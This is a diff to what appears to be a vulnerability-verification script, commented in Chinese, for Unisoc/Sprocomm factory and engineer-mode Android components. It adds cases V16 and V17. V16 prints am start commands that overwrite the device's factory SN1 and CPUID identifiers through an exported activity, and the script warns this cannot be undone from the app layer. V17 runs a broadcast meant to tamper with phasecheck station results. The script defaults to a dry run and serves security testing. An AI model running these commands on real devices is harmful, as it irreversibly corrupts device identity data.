@@ -12,7 +12,10 @@ PKG_FT="com.sprd.factorytest"
 PKG_STAT="com.baidu.duershow.statistic"
 PKG_SRMI="com.sprd.srmi"
 RCV_QMMI="com.sprd.validationtools.difference.receiver.QmmiBroadcastReceiver2"
-RCV_MODEM="com.unisoc.engineermode.modules.debuglog.switchmachineinfo.ModemAssertInfoActivity\$ModemAssertReceiver"
+# 注意：ModemAssertReceiver 是 ModemAssertInfoActivity 的内部类，
+# 类名必须包含 '$'，且不能用反斜杠转义（在 sh 里 \$ 会变成字面量 $，
+# 但部分 shell/am 组合会二次解析导致找不到组件）。故用单引号包裹。
+RCV_MODEM='com.unisoc.engineermode.modules.debuglog.switchmachineinfo.ModemAssertInfoActivity$ModemAssertReceiver'
 
 DRY_RUN=1
 [ "$1" = "--yes" ] && DRY_RUN=0
@@ -83,9 +86,31 @@ echo "  其他码: 83781/83782 (EngineerMode), 1688 (SensorsID), 0000 (PhoneInfo
 
 # ---------- V02 ----------
 banner "V02  PingActivity -> system UID 执行 ping"
-echo "  注意: 该 Activity 未导出, am start 会被拒"
+echo "  注意: 该 Activity 未导出 (exported=false), am start 会被拒"
 echo "  实际路径: EngineerMode -> DEBUG&LOG -> Design For Test -> Ping packages"
+echo "  [预期失败, 仅用于确认 exported 状态]"
 run am start -n "$PKG_EM/com.unisoc.engineermode.modules.debuglog.designfortest.pingpackages.PingActivity"
+
+# ---------- V16 ----------
+banner "V16  CountryCodeSettings -> phasecheck miscdata 任意偏移写入"
+echo "  组件: $PKG_MMI/com.hmd.miscdatawriter.CountryCodeSettings"
+echo "  exported=true 且无权限, adb shell 可直接启动"
+echo "  偏移 9252  = SN1 区"
+echo "  偏移 11216 = CPUID 区"
+echo "  [!] 警告: 写入的是设备出厂标识, 无应用层回滚路径"
+echo "  [!] 需产线工具读取原值备份, 或重刷 phasecheck 分区才能恢复"
+echo "  [默认不执行, 仅打印命令]"
+echo "    am start -n $PKG_MMI/com.hmd.miscdatawriter.CountryCodeSettings -a sprocomm.intent.action.SKUID --es save_flag POC_SN1"
+echo "    am start -n $PKG_MMI/com.hmd.miscdatawriter.CountryCodeSettings -a sprocomm.intent.action.SKUID --es save_flag1 POC_CPUID"
+
+# ---------- V17 ----------
+banner "V17  PhaseCheckBroadcastReceiver -> 任意 station 篡改"
+echo "  组件: $PKG_MMI/com.sprd.validationtools.PhaseCheckBroadcastReceiver"
+echo "  权限: com.android.permission.SAVE_PHASECHECK (未声明 protectionLevel -> normal)"
+echo "  注: am broadcast 以 shell(2000) 身份执行, 不持有该权限, 会被拒"
+echo "  必须由一个声明了该 uses-permission 的已安装应用触发, 见 docs/V17"
+echo "  [预期失败, 仅用于确认权限检查生效]"
+run am broadcast -a com.sprd.validationtools.SAVE_PHASECHECK -n "$PKG_MMI/com.sprd.validationtools.PhaseCheckBroadcastReceiver" --es station_name AUDIO --es station_result 0
 
 # ---------- V01 ----------
 banner "V01  FactoryReset (绝对不要自动执行)"
